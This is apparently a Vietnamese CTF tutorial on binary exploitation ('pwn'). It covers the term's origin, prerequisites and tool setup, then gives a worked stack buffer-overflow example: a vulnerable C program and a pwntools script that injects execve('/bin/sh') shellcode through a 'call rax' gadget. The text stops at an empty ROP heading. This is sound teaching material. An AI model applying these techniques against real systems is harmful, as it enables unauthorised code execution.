# Đôi điều về Pwnable/Pwn

## 1. Lịch sử Pwn

​	Theo user Tactical Ghost trên Urban Dictionary: "pwn (v.) /pəʊn/ có nghĩa là át chế đối phương (trong game, v.v.)". Nguồn gốc của từ Pwn được cho là ở thời mà người người chơi WarCraft, nhà nhà chơi WarCraft, khi mà một người thiết kế map đã nhầm "Own" thành "Pwn" do "O" sát với "P" trên bàn phím QWERTY. Một thông báo đáng lẽ là "player has been owned" đã bị lỗi thành "player has been pwned".

## 2. Pwnable/Pwn trong CTF và ứng dụng thực tế

​	Mục đích thông thường của pwn: Binary exploitation -> Privilege escalation

​	Trong CTF, pwn đa phần chỉ tập trung vào binary exploitation, get shell máy victim, tìm kiếm flag và submit. Môi trường mà người chơi phải tiến hành pwn thường sẽ là linux. 

​	Tập lệnh trong binary hầu hết là intel x86, x86-64, một vài trường hợp có thể binary sử dụng arm instructions. 

​	Ứng dụng của pwn trong thực tế:

- Khai thác lỗi kernel: các máy chủ sử dụng nhân linux,...

- Khai thác lỗi phần mềm: sudo, afpd,... 

## 3. Kiến thức nền

- Khả năng đọc hiểu code C (các hàm thông dụng - gets, printf, scanf, read, write, mmap, calloc, malloc, cấu trúc dữ liệu - đặc biệt là con trỏ)
- Khả năng đọc hiểu assembly (i386, x86-64, arm64, mips64el,...)
- Khả năng code python và sử dụng các thư viện hỗ trợ (pwntools)
- Khả năng debug dùng các công cụ debugger như gdb (plugin pwndbg, gef, peda), windbg, x64dbg,..., kết hợp đọc code sử dụng công cụ disasembler: ida, ghidra, binary ninja,... 
- Kiến thức về dịch ngược, các lỗ hổng cơ bản và cách khai thác.

## 4. Setup hệ thống

- Ubuntu WSL2 | Máy ảo Ubuntu | Máy vật lý Ubuntu (Các máy chủ challenge run app thường sẽ chạy hđh Ubuntu)

- Python 3

- Thư viện pwntools

  `sudo apt-get update`
  `sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential`
  `sudo python3 -m pip install --upgrade pip`
  `sudo python3 -m pip install --upgrade pwntools`

- pwninit

  `sudo apt-get openssl liblzma-dev pkg-config`
  `git clone https://github.com/io12/pwninit`
  `cd pwninit`
  `cargo install pwninit`

- one_gadget

- Một số dependency cho foreign architecture

```
# i386
sudo apt install libc6-i386
# qemu-user
sudo apt install qemu-user
sudo mkdir /etc/qemu-binfmt
# ARMv5
sudo apt install libc6-armel-cross
sudo ln -s /usr/arm-linux-gnueabi /etc/qemu-binfmt/arm
# MIPS
sudo apt install libc6-mipsel-cross
sudo ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel
```

- Plugin pwndbg

## 5. Một số dạng thường gặp

### Shellcode

```
#include<stdio.h>

void init() {
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
}

void run(char name[]) {
    char buf[524];
    int c = 0;
    puts("What's your name?");
    printf("> ");
    read(0, name, 80);
    puts("What do you want for christmas?");
    printf("> ");
    read(0, buf, 544); 
    return name;
}

int main() {
    char name[80];
    init();
    run(name);
    return 0;
}
```

In `run()`, enter 80-byte `name[]` (no error because `name[]` is initialized to 80 bytes), then enter 544-byte `buf[]` (there is a buffer overflow error because `buf[]` is only initialized to 524 bytes).

![alt text](/images/image.png)

`checksec` we see that `NX` is turned off => Stack can be executed => Shellcode when put on Stack will be executed.

When debugging, enter `buf[]` of 544 bytes:

![alt text](/images/image-1.png)

See that at `ret` the address has been overwritten by `buf` => has control over the program.

To execute Shellcode, we need to let the program return a pointer to that Shellcode. `RAX` is pointing to the `name[]`, we use `RAX` to point to the Shellcode. Then `ret` to a gadget to call that Shellcode.

Using gadget ```call rax;```

![alt text](/images/image-3.png)

Using Shellcode of the function `execve('/bin/sh', 0, 0)` to get the shell of the program.

![alt text](/images/image-2.png)

Next, we need to find the offset to ret to overwrite with the address of `call rax;`

![alt text](/images/image-4.png)

Using ```cyclic -l``` finds an offset of 536.

#### Exploit
```
#!/usr/bin/ python3

from pwn import*

context.binary = exe = ELF('./bof5', checksec=False)
p = process(exe.path)

offset = 536

shellcode = asm(
    '''
    mov rax, 0x3b                   # rax = 0x3b
    mov rdi, 29400045130965551      # 29400045130965551 = '/bin/sh'
    push rdi                        
    mov rdi, rsp                    # rdi trỏ tới chuỗi '/bin/sh'
    xor rsi, rsi                    # rsi = 0
    xor rdx, rdx                    # rdx = 0

    syscall                         
    ''', arch='amd64')              

call_rax = 0x0000000000401014

p.sendafter(b'> ', shellcode)

p.sendafter(b'> ', b'A' * offset + p64(call_rax))

p.interactive()
```

![alt text](/images/image-5.png)

### Return Oriented Programming (ROP)
